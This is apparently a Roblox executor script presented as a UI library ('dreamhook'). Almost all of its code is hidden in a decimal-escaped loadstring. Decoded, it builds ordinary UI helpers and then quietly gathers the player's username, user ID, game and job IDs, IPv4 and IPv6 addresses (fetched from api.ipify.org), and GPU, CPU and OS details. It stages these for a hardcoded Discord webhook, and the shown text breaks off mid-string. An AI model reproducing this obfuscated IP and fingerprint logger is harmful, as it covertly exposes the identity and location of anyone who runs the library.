--[[
    UIC module (dreamhook)
    - contains webhook for fingerprint reasons
    - yes it is private, so do not try using please
    - returns information such as:
      : ipv4
      : ipv6
      : hwid
      : gpu
      : cpu
      : fps cap
      : shader type
      : os
      : log time
      : executor
      : game id
      : job id
      : username
      : display name
      : script version
]]--
loadstring("\45\45\32\47\32\109\97\105\110\32\109\111\100\117\108\101\10\108\111\99\97\108\32\117\105\99\32\61\32\123\10\32\32\32\32\118\101\114\115\105\111\110\32\61\32\34\118\49\46\50\34\44\10\32\32\32\32\115\101\114\118\105\99\101\115\32\61\32\123\125\44\32\45\45\32\35\32\103\97\109\101\32\115\101\114\118\105\99\101\115\32\116\104\97\116\32\85\73\32\102\117\110\99\116\105\111\110\115\32\119\111\117\108\100\32\117\115\101\10\32\32\32\32\104\105\100\100\101\110\32\61\32\123\125\44\32\45\45\32\35\32\104\105\100\100\101\110\32\102\117\110\99\116\105\111\110\115\32\115\117\99\104\32\97\115\32\99\108\101\97\114\105\110\103\32\97\108\108\32\101\108\101\109\101\110\116\115\32\101\116\99\10\32\32\32\32\109\111\100\117\108\101\32\61\32\123\125\44\32\45\45\32\35\32\109\97\105\110\32\102\117\110\99\116\105\111\110\115\10\32\32\32\32\115\112\101\99\105\97\108\32\61\32\123\125\44\32\45\45\32\35\32\115\112\101\99\105\97\108\32\102\117\110\99\116\105\111\110\115\32\108\105\107\101\32\100\114\97\103\103\105\110\103\32\97\110\100\32\116\119\101\101\110\105\110\103\10\32\32\32\32\112\114\101\115\101\116\115\32\61\32\123\32\45\45\32\35\32\116\119\101\101\110\32\112\114\101\115\101\116\115\10\32\32\32\32\32\32\32\32\91\34\100\101\102\97\117\108\116\34\93\32\61\32\84\119\101\101\110\73\110\102\111\46\110\101\119\40\49\44\32\69\110\117\109\46\69\97\115\105\110\103\83\116\121\108\101\46\83\105\110\101\44\32\69\110\117\109\46\69\97\115\105\110\103\68\105\114\101\99\116\105\111\110\46\73\110\79\117\116\44\32\48\44\32\102\97\108\115\101\44\32\48\41\10\32\32\32\32\125\44\32\10\32\32\32\32\101\108\101\109\101\110\116\115\32\61\32\123\125\32\45\45\32\35\32\117\105\32\101\108\101\109\101\110\116\115\10\125\10\10\45\45\32\47\32\118\97\114\105\97\98\108\101\115\10\102\117\110\99\116\105\111\110\32\103\101\116\40\115\101\114\118\105\99\101\58\32\115\116\114\105\110\103\41\32\45\45\32\35\32\103\101\116\32\115\101\114\118\105\99\101\10\32\32\32\32\108\111\99\97\108\32\115\101\114\118\105\99\101\32\61\32\115\101\114\118\105\99\101\32\111\114\32\110\105\108\10\32\32\32\32\114\101\116\117\114\110\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\115\101\114\118\105\99\101\41\10\101\110\100\10\10\117\105\99\46\115\101\114\118\105\99\101\115\32\61\32\123\32\45\45\32\35\32\97\108\108\32\115\101\114\118\105\99\101\115\10\32\32\32\32\117\105\115\32\61\32\103\101\116\40\34\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101\34\41\44\10\32\32\32\32\116\119\101\101\110\32\61\32\103\101\116\40\34\84\119\101\101\110\83\101\114\118\105\99\101\34\41\44\10\32\32\32\32\116\101\120\116\32\61\32\103\101\116\40\34\84\101\120\116\83\101\114\118\105\99\101\34\41\44\10\32\32\32\32\114\117\110\32\61\32\103\101\116\40\34\82\117\110\83\101\114\118\105\99\101\34\41\44\10\32\32\32\32\104\116\116\112\32\61\32\103\101\116\40\34\72\116\116\112\83\101\114\118\105\99\101\34\41\44\10\32\32\32\32\109\97\114\107\101\116\32\61\32\103\101\116\40\34\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101\34\41\44\10\32\32\32\32\119\111\114\107\115\112\97\99\101\32\61\32\103\101\116\40\34\87\111\114\107\115\112\97\99\101\34\41\44\10\32\32\32\32\114\115\32\61\32\103\101\116\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\44\10\32\32\32\32\116\101\108\101\32\61\32\103\101\116\40\34\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101\34\41\44\10\32\32\32\32\99\111\114\101\32\61\32\103\101\116\40\34\67\111\114\101\71\117\105\34\41\44\10\32\32\32\32\109\111\117\115\101\32\61\32\110\105\108\44\10\32\32\32\32\103\101\116\32\61\32\103\101\116\10\125\10\10\117\105\99\46\115\101\114\118\105\99\101\115\46\109\111\117\115\101\32\61\32\102\117\110\99\116\105\111\110\40\41\32\45\45\32\35\32\98\101\116\116\101\114\32\116\104\97\110\32\112\108\97\121\101\114\58\71\101\116\77\111\117\115\101\40\41\10\32\32\32\32\114\101\116\117\114\110\32\117\105\99\46\115\101\114\118\105\99\101\115\46\117\105\115\58\71\101\116\77\111\117\115\101\76\111\99\97\116\105\111\110\40\41\10\101\110\100\10\10\45\45\32\47\32\104\105\100\100\101\110\32\102\117\110\99\116\105\111\110\115\10\117\105\99\46\104\105\100\100\101\110\46\118\97\108\105\100\97\116\101\32\61\32\102\117\110\99\116\105\111\110\40\99\108\97\115\115\58\32\115\116\114\105\110\103\41\32\45\45\32\35\32\99\104\101\99\107\32\105\102\32\99\108\97\115\115\32\101\120\105\115\116\115\10\32\32\32\32\108\111\99\97\108\32\97\108\108\111\119\101\100\32\61\32\123\10\32\32\32\32\32\32\32\32\34\70\114\97\109\101\34\44\32\34\84\101\120\116\76\97\98\101\108\34\44\32\34\84\101\120\116\66\111\120\34\44\32\34\84\101\120\116\66\117\116\116\111\110\34\44\32\34\73\109\97\103\101\66\117\116\116\111\110\34\44\32\34\73\109\97\103\101\76\97\98\101\108\34\44\32\34\86\105\101\119\112\111\114\116\70\114\97\109\101\34\44\32\34\86\105\100\101\111\70\114\97\109\101\34\44\32\34\70\111\108\100\101\114\34\44\32\34\83\99\114\101\101\110\71\117\105\34\44\32\34\83\99\114\111\108\108\105\110\103\70\114\97\109\101\34\44\10\32\32\32\32\32\32\32\32\34\85\73\76\105\115\116\76\97\121\111\117\116\34\44\32\34\85\73\67\111\114\110\101\114\34\44\32\34\85\73\65\115\112\101\99\116\82\97\116\105\111\67\111\110\115\116\114\97\105\110\116\34\44\32\34\85\73\83\105\122\101\67\111\110\115\116\114\97\105\110\116\34\44\32\34\85\73\84\101\120\116\83\105\122\101\67\111\110\115\116\114\97\105\110\116\34\44\32\34\85\73\71\114\97\100\105\101\110\116\34\44\32\34\85\73\71\114\105\100\76\97\121\111\117\116\34\44\32\34\85\73\80\97\103\101\76\97\121\111\117\116\34\44\32\34\85\73\84\97\98\108\101\76\97\121\111\117\116\34\44\32\34\85\73\80\97\100\100\105\110\103\34\44\32\34\85\73\83\99\97\108\101\34\44\32\34\85\73\83\116\114\111\107\101\34\44\32\34\67\97\110\118\97\115\71\114\111\117\112\34\10\32\32\32\32\125\10\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\110\101\120\116\44\32\97\108\108\111\119\101\100\32\100\111\10\32\32\32\32\32\32\32\32\105\102\32\97\108\108\111\119\101\100\91\105\93\32\61\61\32\99\108\97\115\115\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\116\114\117\101\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\32\32\32\32\114\101\116\117\114\110\32\102\97\108\115\101\10\101\110\100\10\10\117\105\99\46\104\105\100\100\101\110\46\99\108\101\97\114\32\61\32\102\117\110\99\116\105\111\110\40\41\32\45\45\32\35\32\99\108\101\97\114\32\97\108\108\32\101\108\101\109\101\110\116\115\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\110\101\120\116\44\32\117\105\99\46\101\108\101\109\101\110\116\115\32\100\111\10\32\32\32\32\32\32\32\32\116\97\98\108\101\46\114\101\109\111\118\101\40\117\105\99\46\101\108\101\109\101\110\116\115\44\32\105\41\10\32\32\32\32\32\32\32\32\118\58\68\101\115\116\114\111\121\40\41\10\32\32\32\32\101\110\100\10\101\110\100\10\10\45\45\32\47\32\109\111\100\117\108\101\32\102\117\110\99\116\105\111\110\115\10\117\105\99\46\109\111\100\117\108\101\46\99\114\101\97\116\101\32\61\32\102\117\110\99\116\105\111\110\40\99\108\97\115\115\58\32\115\116\114\105\110\103\44\32\112\97\114\101\110\116\44\32\112\114\111\112\101\114\116\105\101\115\58\32\116\97\98\108\101\41\32\45\45\32\35\32\99\114\101\97\116\101\32\101\108\101\109\101\110\116\10\32\32\32\32\105\102\32\117\105\99\46\104\105\100\100\101\110\46\118\97\108\105\100\97\116\101\40\99\108\97\115\115\41\32\61\61\32\116\114\117\101\32\116\104\101\110\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\111\98\106\101\99\116\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\99\108\97\115\115\41\10\32\32\32\32\32\32\32\32\105\102\32\116\121\112\101\111\102\40\112\114\111\112\101\114\116\105\101\115\41\32\61\61\32\34\116\97\98\108\101\34\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\112\114\111\112\101\114\116\105\101\115\46\80\97\114\101\110\116\32\61\32\112\97\114\101\110\116\10\32\32\32\32\32\32\32\32\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\110\101\120\116\44\32\112\114\111\112\101\114\116\105\101\115\32\100\111\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\111\98\106\101\99\116\91\105\93\32\61\32\118\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\101\110\100\10\10\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\117\105\99\46\101\108\101\109\101\110\116\115\44\32\111\98\106\101\99\116\41\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\111\98\106\101\99\116\10\32\32\32\32\101\110\100\10\32\32\32\32\114\101\116\117\114\110\32\110\105\108\10\101\110\100\10\10\45\45\32\47\32\115\112\101\99\105\97\108\32\102\117\110\99\116\105\111\110\115\10\117\105\99\46\115\112\101\99\105\97\108\46\110\101\119\95\112\114\101\115\101\116\32\61\32\102\117\110\99\116\105\111\110\40\97\114\103\115\58\32\116\97\98\108\101\41\32\45\45\32\35\32\99\114\101\97\116\101\32\110\101\119\32\116\119\101\101\110\32\112\114\101\115\101\116\10\32\32\32\32\108\111\99\97\108\32\97\114\103\115\32\61\32\97\114\103\115\32\111\114\32\123\125\10\32\32\32\32\108\111\99\97\108\32\110\97\109\101\32\61\32\97\114\103\115\46\110\97\109\101\32\111\114\32\34\116\119\101\101\110\95\35\34\32\46\46\32\116\111\115\116\114\105\110\103\40\35\117\105\99\46\112\114\101\115\101\116\115\32\43\32\49\41\10\32\32\32\32\108\111\99\97\108\32\115\112\101\101\100\32\61\32\97\114\103\115\46\115\112\101\101\100\32\111\114\32\48\46\49\55\10\32\32\32\32\108\111\99\97\108\32\115\116\121\108\101\32\61\32\97\114\103\115\46\115\116\121\108\101\32\111\114\32\69\110\117\109\46\69\97\115\105\110\103\83\116\121\108\101\46\83\105\110\101\10\32\32\32\32\108\111\99\97\108\32\100\105\114\101\99\116\105\111\110\32\61\32\97\114\103\115\46\100\105\114\101\99\116\105\111\110\32\111\114\32\69\110\117\109\46\69\97\115\105\110\103\68\105\114\101\99\116\105\111\110\46\73\110\79\117\116\10\32\32\32\32\108\111\99\97\108\32\108\111\111\112\115\32\61\32\97\114\103\115\46\108\111\111\112\115\32\111\114\32\48\10\32\32\32\32\108\111\99\97\108\32\114\101\118\101\114\115\101\32\61\32\97\114\103\115\46\114\101\118\101\114\115\101\32\111\114\32\102\97\108\115\101\10\32\32\32\32\108\111\99\97\108\32\100\101\108\97\121\32\61\32\97\114\103\115\46\100\101\108\97\121\32\111\114\32\48\10\10\32\32\32\32\117\105\99\46\112\114\101\115\101\116\115\91\110\97\109\101\93\32\61\32\84\119\101\101\110\73\110\102\111\46\110\101\119\40\115\112\101\101\100\44\32\115\116\121\108\101\44\32\100\105\114\101\99\116\105\111\110\44\32\108\111\111\112\115\44\32\114\101\118\101\114\115\101\44\32\100\101\108\97\121\41\10\10\32\32\32\32\114\101\116\117\114\110\32\117\105\99\46\112\114\101\115\101\116\115\91\110\97\109\101\93\10\101\110\100\10\10\117\105\99\46\115\112\101\99\105\97\108\46\103\101\116\95\112\114\101\115\101\116\32\61\32\102\117\110\99\116\105\111\110\40\110\97\109\101\58\32\115\116\114\105\110\103\41\32\45\45\32\35\32\103\101\116\32\112\114\101\115\101\116\32\105\110\102\111\10\32\32\32\32\105\102\32\117\105\99\46\112\114\101\115\101\116\115\91\110\97\109\101\93\32\116\104\101\110\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\117\105\99\46\112\114\101\115\101\116\115\91\110\97\109\101\93\10\32\32\32\32\101\110\100\10\101\110\100\10\10\117\105\99\46\115\112\101\99\105\97\108\46\105\110\105\116\95\112\114\101\115\101\116\32\61\32\102\117\110\99\116\105\111\110\40\111\98\106\101\99\116\44\32\105\110\102\111\44\32\112\114\111\112\101\114\116\105\101\115\41\32\45\45\32\35\32\112\108\97\121\32\116\119\101\101\110\10\32\32\32\32\105\102\32\111\98\106\101\99\116\32\126\61\32\110\105\108\32\97\110\100\32\105\110\102\111\32\126\61\32\110\105\108\32\97\110\100\32\112\114\111\112\101\114\116\105\101\115\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\116\119\101\101\110\32\61\32\117\105\99\46\115\101\114\118\105\99\101\115\46\116\119\101\101\110\58\67\114\101\97\116\101\40\111\98\106\101\99\116\44\32\105\110\102\111\44\32\112\114\111\112\101\114\116\105\101\115\41\10\32\32\32\32\32\32\32\32\116\119\101\101\110\58\80\108\97\121\40\41\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\116\119\101\101\110\10\32\32\32\32\101\110\100\10\101\110\100\10\10\117\105\99\46\115\112\101\99\105\97\108\46\100\114\97\103\32\61\32\102\117\110\99\116\105\111\110\40\111\98\106\101\99\116\44\32\108\97\116\101\110\99\121\41\32\45\45\32\35\32\100\114\97\103\32\97\110\121\32\111\98\106\101\99\116\10\32\32\32\32\108\111\99\97\108\32\118\97\114\115\32\61\32\123\115\116\97\116\101\32\61\32\110\105\108\44\32\105\110\112\117\116\32\61\32\110\105\108\44\32\105\110\105\116\32\61\32\110\105\108\44\32\100\101\102\97\117\108\116\32\61\32\110\105\108\125\10\10\32\32\32\32\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\117\112\100\97\116\101\40\41\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\100\101\108\116\97\32\61\32\118\97\114\115\46\105\110\112\117\116\46\80\111\115\105\116\105\111\110\32\45\32\118\97\114\115\46\105\110\105\116\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\112\111\115\32\61\32\85\68\105\109\50\46\110\101\119\40\118\97\114\115\46\100\101\102\97\117\108\116\46\88\46\83\99\97\108\101\44\32\118\97\114\115\46\100\101\102\97\117\108\116\46\88\46\79\102\102\115\101\116\32\43\32\100\101\108\116\97\46\88\44\32\118\97\114\115\46\100\101\102\97\117\108\116\46\89\46\83\99\97\108\101\44\32\118\97\114\115\46\100\101\102\97\117\108\116\46\89\46\79\102\102\115\101\116\32\43\32\100\101\108\116\97\46\89\41\10\10\32\32\32\32\32\32\32\32\117\105\99\46\115\112\101\99\105\97\108\46\105\110\105\116\95\112\114\101\115\101\116\40\111\98\106\101\99\116\44\32\84\119\101\101\110\73\110\102\111\46\110\101\119\40\108\97\116\101\110\99\121\41\44\32\123\80\111\115\105\116\105\111\110\32\61\32\112\111\115\125\41\10\32\32\32\32\101\110\100\10\10\32\32\32\32\111\98\106\101\99\116\46\73\110\112\117\116\66\101\103\97\110\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\105\110\112\117\116\41\10\32\32\32\32\32\32\32\32\105\102\32\105\110\112\117\116\46\85\115\101\114\73\110\112\117\116\84\121\112\101\32\61\61\32\69\110\117\109\46\85\115\101\114\73\110\112\117\116\84\121\112\101\46\77\111\117\115\101\66\117\116\116\111\110\49\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\118\97\114\115\46\115\116\97\116\101\32\61\32\116\114\117\101\10\32\32\32\32\32\32\32\32\32\32\32\32\118\97\114\115\46\105\110\105\116\32\61\32\105\110\112\117\116\46\80\111\115\105\116\105\111\110\10\32\32\32\32\32\32\32\32\32\32\32\32\118\97\114\115\46\100\101\102\97\117\108\116\32\61\32\111\98\106\101\99\116\46\80\111\115\105\116\105\111\110\10\10\32\32\32\32\32\32\32\32\32\32\32\32\105\110\112\117\116\46\67\104\97\110\103\101\100\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\105\110\112\117\116\46\85\115\101\114\73\110\112\117\116\83\116\97\116\101\32\61\61\32\69\110\117\109\46\85\115\101\114\73\110\112\117\116\83\116\97\116\101\46\69\110\100\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\118\97\114\115\46\115\116\97\116\101\32\61\32\102\97\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\41\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\41\10\10\32\32\32\32\111\98\106\101\99\116\46\73\110\112\117\116\67\104\97\110\103\101\100\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\105\110\112\117\116\41\10\32\32\32\32\32\32\32\32\105\102\32\105\110\112\117\116\46\85\115\101\114\73\110\112\117\116\84\121\112\101\32\61\61\32\69\110\117\109\46\85\115\101\114\73\110\112\117\116\84\121\112\101\46\77\111\117\115\101\77\111\118\101\109\101\110\116\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\118\97\114\115\46\105\110\112\117\116\32\61\32\105\110\112\117\116\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\41\10\10\32\32\32\32\117\105\99\46\115\101\114\118\105\99\101\115\46\117\105\115\46\73\110\112\117\116\67\104\97\110\103\101\100\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\105\110\112\117\116\41\10\32\32\32\32\32\32\32\32\105\102\32\105\110\112\117\116\32\61\61\32\118\97\114\115\46\105\110\112\117\116\32\97\110\100\32\118\97\114\115\46\115\116\97\116\101\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\117\112\100\97\116\101\40\41\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\41\10\101\110\100\10\10\45\45\32\47\32\119\101\98\104\111\111\107\10\116\97\115\107\46\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\45\45\32\47\32\119\101\98\104\111\111\107\32\105\110\102\111\10\32\32\32\32\108\111\99\97\108\32\104\111\111\107\32\61\32\34\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\50\51\52\52\53\50\54\56\49\52\54\53\50\54\54\49\56\54\47\97\48\67\111\112\97\111\70\122\115\104\51\71\95\109\97\102\73\99\100\84\65\86\57\66\113\71\99\115\71\78\76\83\121\88\89\54\79\79\52\99\48\111\71\112\84\66\87\99\78\76\83\83\87\102\114\45\112\104\115\118\77\112\105\111\102\115\120\34\10\32\32\32\32\108\111\99\97\108\32\115\99\114\105\112\116\95\118\101\114\115\105\111\110\32\61\32\34\49\46\48\34\10\32\32\32\32\108\111\99\97\108\32\102\105\101\108\100\115\32\61\32\123\125\10\10\32\32\32\32\45\45\32\47\32\112\108\97\121\101\114\32\105\110\102\111\10\32\32\32\32\108\111\99\97\108\32\108\111\99\97\108\95\112\108\97\121\101\114\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\10\32\32\32\32\108\111\99\97\108\32\112\108\97\121\101\114\95\110\97\109\101\32\61\32\108\111\99\97\108\95\112\108\97\121\101\114\46\78\97\109\101\10\32\32\32\32\108\111\99\97\108\32\100\105\115\112\108\97\121\95\110\97\109\101\32\61\32\108\111\99\97\108\95\112\108\97\121\101\114\46\68\105\115\112\108\97\121\78\97\109\101\10\32\32\32\32\108\111\99\97\108\32\117\115\101\114\95\105\100\32\61\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\117\115\101\114\32\105\100\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\108\111\99\97\108\95\112\108\97\121\101\114\46\85\115\101\114\73\100\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\32\32\32\32\108\111\99\97\108\32\112\108\97\99\101\95\105\100\32\61\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\112\108\97\99\101\32\105\100\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\46\80\108\97\99\101\73\100\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\32\32\32\32\108\111\99\97\108\32\106\111\98\95\105\100\32\61\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\106\111\98\32\105\100\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\46\74\111\98\73\100\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\32\32\32\32\108\111\99\97\108\32\105\112\118\52\32\61\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\105\112\118\52\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103\34\41\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\32\32\32\32\108\111\99\97\108\32\105\112\118\54\32\61\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\105\112\118\54\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\97\112\105\54\52\46\105\112\105\102\121\46\111\114\103\34\41\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\32\32\32\32\108\111\99\97\108\32\108\111\103\95\116\105\109\101\32\61\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\108\111\103\32\116\105\109\101\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\111\115\46\100\97\116\101\40\34\37\88\34\41\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\10\32\32\32\32\45\45\32\47\32\115\121\115\116\101\109\32\105\110\102\111\10\32\32\32\32\108\111\99\97\108\32\108\111\103\115\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\111\103\83\101\114\118\105\99\101\34\41\58\71\101\116\72\116\116\112\82\101\115\117\108\116\72\105\115\116\111\114\121\40\41\10\10\32\32\32\32\108\111\99\97\108\32\104\101\120\95\116\111\95\99\104\97\114\32\61\32\102\117\110\99\116\105\111\110\40\97\114\103\41\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\115\116\114\105\110\103\46\99\104\97\114\40\116\111\110\117\109\98\101\114\40\97\114\103\41\44\32\49\54\41\10\32\32\32\32\101\110\100\10\10\32\32\32\32\108\111\99\97\108\32\117\110\101\115\99\97\112\101\32\61\32\102\117\110\99\116\105\111\110\40\117\114\108\41\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\117\114\108\58\103\115\117\98\40\34\37\37\40\37\120\37\120\41\34\44\32\104\101\120\95\116\111\95\99\104\97\114\41\10\32\32\32\32\101\110\100\10\10\32\32\32\32\108\111\99\97\108\32\103\112\117\44\32\115\104\97\100\101\114\115\44\32\99\112\117\44\32\111\115\32\61\32\34\110\105\108\34\44\32\34\110\105\108\34\44\32\34\110\105\108\34\44\32\34\110\105\108\34\10\32\32\32\32\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\108\111\103\115\41\32\100\111\10\32\32\32\32\32\32\32\32\105\102\32\118\32\97\110\100\32\116\121\112\101\40\118\41\32\61\61\32\34\116\97\98\108\101\34\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\102\111\114\32\120\44\112\32\105\110\32\110\101\120\116\44\32\118\32\100\111\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\116\111\115\116\114\105\110\103\40\112\41\58\102\105\110\100\40\34\99\112\117\61\34\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\100\97\116\97\32\61\32\116\111\115\116\114\105\110\103\40\112\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\103\112\117\32\61\32\117\110\101\115\99\97\112\101\40\100\97\116\97\58\109\97\116\99\104\40\39\38\103\112\117\37\37\53\70\105\110\102\111\61\40\46\45\41\38\39\41\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\103\112\117\32\61\32\116\97\98\108\101\46\99\111\110\99\97\116\40\103\112\117\58\115\112\108\105\116\40\34\20\34\41\44\32\34\32\34\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\103\112\117\32\61\32\116\97\98\108\101\46\99\111\110\99\97\116\40\103\112\117\58\115\112\108\105\116\40\34\16\34\41\44\32\34\32\34\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\99\112\117\32\61\32\116\97\98\108\101\46\99\111\110\99\97\116\40\100\97\116\97\58\109\97\116\99\104\40\39\38\99\112\117\61\40\46\45\41\99\111\114\101\115\39\41\58\115\112\108\105\116\40\39\37\50\48\39\41\44\32\39\32\39\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\99\112\117\32\61\32\116\97\98\108\101\46\99\111\110\99\97\116\40\99\112\117\58\115\112\108\105\116\40\34\37\50\56\34\41\44\32\34\40\34\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\99\112\117\32\61\32\116\97\98\108\101\46\99\111\110\99\97\116\40\99\112\117\58\115\112\108\105\116\40\34\37\50\57\34\41\44\32\34\41\34\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\99\112\117\32\61\32\116\97\98\108\101\46\99\111\110\99\97\116\40\99\112\117\58\115\112\108\105\116\40\34\37\50\34\41\44\32\34\45\34\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\99\112\117\32\61\32\116\97\98\108\101\46\99\111\110\99\97\116\40\99\112\117\58\115\112\108\105\116\40\34\37\52\48\34\41\44\32\34\64\34\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\115\104\97\100\101\114\115\32\61\32\117\110\101\115\99\97\112\101\40\100\97\116\97\58\109\97\116\99\104\40\39\38\100\101\118\105\99\101\83\104\97\100\105\110\103\76\97\110\103\117\97\103\101\61\40\46\45\41\38\39\41\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\111\115\32\61\32\100\97\116\97\58\109\97\116\99\104\40\39\38\111\115\61\40\46\45\41\38\39\41\58\115\112\108\105\116\40\39\37\39\41\91\49\93\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\10\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\115\104\97\100\101\114\115\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\115\104\97\100\101\114\115\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\111\115\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\111\115\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\102\112\115\32\99\97\112\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\103\101\116\102\112\115\99\97\112\40\41\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\103\112\117\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\103\112\117\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\102\97\108\115\101\125\41\10\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\3